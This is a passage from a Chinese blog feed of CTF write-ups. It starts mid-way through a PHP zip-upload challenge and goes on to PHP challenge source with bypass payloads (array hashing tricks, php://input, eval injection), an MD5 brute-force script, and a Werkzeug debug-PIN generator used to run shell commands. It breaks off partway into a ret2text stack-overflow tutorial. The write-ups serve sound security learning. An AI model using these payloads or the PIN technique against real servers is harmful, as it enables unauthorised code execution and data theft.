class="string">'dirname'</span>]))&#123;</span><br><span class="line">                    @mkdir($dir.<span class="string">'/'</span>.$pathinfo[<span class="string">'dirname'</span>], <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(file_exists($dir.<span class="string">'/'</span>.$pathinfo[<span class="string">'dirname'</span>]))&#123;</span><br><span class="line">                    copy(<span class="string">"zip://"</span>.<span class="keyword">$this</span>-&gt;file.<span class="string">"#"</span>.$filename, $dir.<span class="string">'/'</span>.$filename);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;debug)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Extract: '</span>.$dir.<span class="string">'/'</span>.$filename.<span class="string">"\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $list = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;iszip() === <span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="keyword">$this</span>-&gt;za-&gt;numFiles; $i++) &#123;</span><br><span class="line">                $filename = <span class="keyword">$this</span>-&gt;za-&gt;getNameIndex($i);</span><br><span class="line">                $list[] = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContents</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">"zip://"</span>.<span class="keyword">$this</span>-&gt;file.<span class="string">"#"</span>.$filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;za-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrchr(basename($name), <span class="string">'.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]) &amp;&amp; !$_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>])&#123;</span><br><span class="line">    header(<span class="string">"Content-type: text/plain; charset=utf-8"</span>);</span><br><span class="line">    $ext = getExt($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt; <span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'文件太大了'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($ext !== <span class="string">'.zip'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'文件格式错误'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">        $file = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $sz = <span class="keyword">new</span> SimpleZip($file);</span><br><span class="line">        <span class="keyword">if</span>(!$sz-&gt;iszip())&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'文件格式错误'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = tempnam(sys_get_temp_dir(), <span class="string">'vs.'</span>);</span><br><span class="line">        unlink($tmpname);</span><br><span class="line">        $tmpdir = sys_get_temp_dir().<span class="string">'/'</span>.md5($tmpname);</span><br><span class="line">        mkdir($tmpdir);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($tmpdir))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'系统错误1'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!$sz-&gt;extract($tmpdir))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'系统错误2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $files = $sz-&gt;getFiles();</span><br><span class="line">        $files_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span>($files <span class="keyword">as</span> $name)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!in_array(getExt($name), <span class="keyword">array</span>(<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.jpeg'</span>,<span class="string">'.gif'</span>)) || strpos($name, <span class="string">'.ph'</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                unlink($tmpdir.<span class="string">'/'</span>.$name);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $files_num++;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"/upload/"</span>.md5($tmpname).<span class="string">"/&#123;$name&#125;\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($files_num &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            shell_exec(<span class="string">"mv "</span>.escapeshellarg($tmpdir).<span class="string">" "</span>.escapeshellarg($_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">'/upload/'</span>.md5($tmpname)));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            rmdir($tmpdir);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'没有图片'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="md5爆破脚本"><a href="#md5爆破脚本" class="headerlink" title="md5爆破脚本"></a>md5爆破脚本</h2><p>题目:<code>md5(key)==&quot;5a2a7d385fdaad3fabbe7b11c28bd48e&quot;and the key is ichunqiu[a-z0-9]{5}</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(data)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(data)</span><br><span class="line">    a = m.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">a = <span class="string">'ichunqiu'</span></span><br><span class="line">b = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> b:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> b:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> b:</span><br><span class="line">                    <span class="keyword">if</span> md5(a+i+j+k+l+m)==<span class="string">'5a2a7d385fdaad3fabbe7b11c28bd48e'</span>:</span><br><span class="line">                        print(a+i+j+k+l+m)</span><br></pre></td></tr></table></figure><h2 id="from-2017-bkctf"><a href="#from-2017-bkctf" class="headerlink" title="from 2017.bkctf"></a>from 2017.bkctf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))    </span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line">       <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:<code>url/?uname[]=1#id=margin</code><br>post:<code>passwd[]=2</code></p><h2 id="TXT"><a href="#TXT" class="headerlink" title="TXT"></a>TXT</h2><p>源题目(from 2017.bkctf)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>方法一：$f = trim(file_get_contents($fn)) 想办法获得一个文本文件fn提取字符串赋值给f.可以在自己的服务器上加个txt内容与ac的get值相等是可以做的…再想出题人不可能让每个做的人去自己服务器写个txt吧…于是在这道题URL框后面加了flag.txt就出现了文本信息“flags”…</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/eqkf85cinr.png?imageView2/2/w/1620" alt=""></p><p>payload:<code>url/?ac=flag&amp;fn=url/flag.txt</code></p><p>方法二：狐火页面工具，运用php输入流，将fn获得的值设置为post进去的值.</p><p>payload:<code>url/?ac=123&amp;fn=php://input</code>,post:<code>123</code></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/dk53cb6bsr.png?imageView2/2/w/1620" alt=""></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>源题目(from 2017.bkctf)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>构造：<a href="http://post.bugku.com/hello/(起始网址)" target="_blank" rel="noopener">http://post.bugku.com/hello/(起始网址)</a> + ?hello=print_r(file(“flag.php”)).</p><h2 id="6-正则？"><a href="#6-正则？" class="headerlink" title="6.正则？"></a>6.正则？</h2><p>源题目(from 2017.bkctf):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明白正则就很简单了，/匹配开始,/key匹配第一个key,.<em>匹配0次或多次的除换行符之外的字符，key再匹配一个key,{4,7}key匹配4次到7次的key,\/.\/中，\为转义字符，即匹配符号//并且之中可匹配除换行符意外的任意字符，(.</em>key)意思与之前相同，[a-z]可匹配a-z的字母，[:punct:]意思为可以匹配符号,/i的意思是不区分大小写。</p><p>payload:<code>keykeykeykeykeykeykey:/a/keys[!]</code></p><p><a href="https://cloud.tencent.com/developer/article/1038132" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1038132</a></p><h2 id="2018安恒杯-9月月赛web"><a href="#2018安恒杯-9月月赛web" class="headerlink" title="2018安恒杯-9月月赛web"></a>2018安恒杯-9月月赛web</h2><p>题目源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据代码，我们要满足两个条件：</p><pre><code>1.长度不能大于402.不能包含大小写字母，数字</code></pre><p>参考这篇<a href="https://www.anquanke.com/post/id/154284#h2-3" target="_blank" rel="noopener">文章</a><a href="http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Crypto1" target="_blank" rel="noopener">文章2</a>,利用linux的特性来读取文件.<br>根据师傅们的尝试<code>/???/??? =&gt; /bin/cat</code>,所以我们来查看下源码，经过尝试发现<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">$flag = file_get_contents(&apos;/flag&apos;);</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析只要查看到<code>/flag</code>就可以得到flag,所以payload为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意这些`?&gt;`是为了闭合前面的语句，在重新添加一句ｐｈｐ的语句来执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 粗心的程序员呀(2018安恒8月赛)</span><br><span class="line"></span><br><span class="line">&gt;考点：Flask debug pin安全问题</span><br><span class="line">参考:https://xz.aliyun.com/t/2553</span><br><span class="line">http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/#web</span><br><span class="line">https://www.smi1e.top/%e5%ae%89%e6%81%92%e6%9d%af%e6%9c%88%e8%b5%9bwrite-up/</span><br><span class="line">https://www.jianshu.com/p/e4cfa55a401a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开网站</span><br><span class="line"></span><br><span class="line">![](https://i.loli.net/2018/11/11/5be7b324372ec.png)</span><br><span class="line"></span><br><span class="line">点击注册</span><br><span class="line"></span><br><span class="line">![](https://i.loli.net/2018/11/11/5be7b3240ed12.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">写着什么图床系统，很奇怪,注册之后更奇怪</span><br><span class="line"></span><br><span class="line">![OperationalError database is locked Werkzeug Debugger.png](https://i.loli.net/2018/11/11/5be7b3243eefa.png)</span><br><span class="line"></span><br><span class="line">根据先知那位师傅的解释，主要就是利用Flask在debug模式下会生成一个Debugger PIN,我们就是要获取pin码，才可以进行任意的代码执行，来获取flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考飘零师傅的脚本</span><br><span class="line">```python</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &apos;ctf&apos;,# username</span><br><span class="line">    &apos;flask.app&apos;,# modname</span><br><span class="line">    &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;))</span><br><span class="line">    &apos;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&apos; # getattr(mod, &apos;__file__&apos;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &apos;2485377892354&apos;# str(uuid.getnode()),  /sys/class/net/eth0/address</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&apos;utf-8&apos;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&apos;cookiesalt&apos;)</span><br><span class="line"></span><br><span class="line">cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&apos;pinsalt&apos;)</span><br><span class="line">    num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure></p><p>运行之后得到pin:<code>131-442-946</code></p><p>点击右边那个小终端</p><p><img src="https://i.loli.net/2018/11/11/5be7b679c3075.png" alt=""></p><p>输入刚才的pin</p><p><img src="https://i.loli.net/2018/11/11/5be7b679e9095.png" alt=""></p><p>然后就可以执行命令</p><p><img src="https://i.loli.net/2018/11/11/5be7b67a0b1ab.png" alt=""></p><p>输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[console ready]</span><br><span class="line">&gt;&gt;&gt; from subprocess import check_output</span><br><span class="line">&gt;&gt;&gt; check_output(<span class="string">'ls'</span>,shell=True)</span><br><span class="line"><span class="string">'app\nbin\nboot\ndev\netc\nfff111aaggggg___hhh\nhome\nlib\nlib64\nmedia\nmnt\nopt\n  </span></span><br><span class="line"><span class="string">&gt;&gt;&gt; os.popen('</span>cat fff111aaggggg___hhh<span class="string">').read()</span></span><br><span class="line"><span class="string">'</span>flag&#123;87052362d59339071c5ce607ad28b752&#125;\n<span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/11/5be7b76f5103f.png" alt=""></p><p>##　暴力可解</p><p>盲水印攻击首先爆破压缩包密码<code>23092019</code></p><p><code>python bwm.py decode 1.png 2.png flag.png</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tjctf&quot;&gt;&lt;a href=&quot;#tjctf&quot; class=&quot;headerlink&quot; title=&quot;tjctf&quot;&gt;&lt;/a&gt;tjctf&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn之路_ret2text</title>
    <link href="https://threst.github.io/2018/11/11/pwn%E4%B9%8B%E8%B7%AF_ret2text/"/>
    <id>https://threst.github.io/2018/11/11/pwn之路_ret2text/</id>
    <published>2018-11-11T05:32:13.000Z</published>
    <updated>2018-11-11T10:16:43.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>题目地址:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text</a></p><p>源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> secretcode, input;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    secretcode = rand();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span>(input == secretcode)</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"There is something amazing here, do you know anything?\n"</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题还是出现在gets函数上，可以无限读取用户的输入，只要我们输的足够长，就可以覆盖secure的返回地址，来执行系统操作了,流程理解，首先就是要知道输入多少才可以栈溢出</p><h5 id="寻找什么时候溢出"><a href="#寻找什么时候溢出" class="headerlink" title="寻找什么时候溢出"></a>寻找什么时候溢出</h5><p>我们使用cyclic命令来随机生成２００个’随机’的字符</p><blockquote><p>└──╼ $cyclic 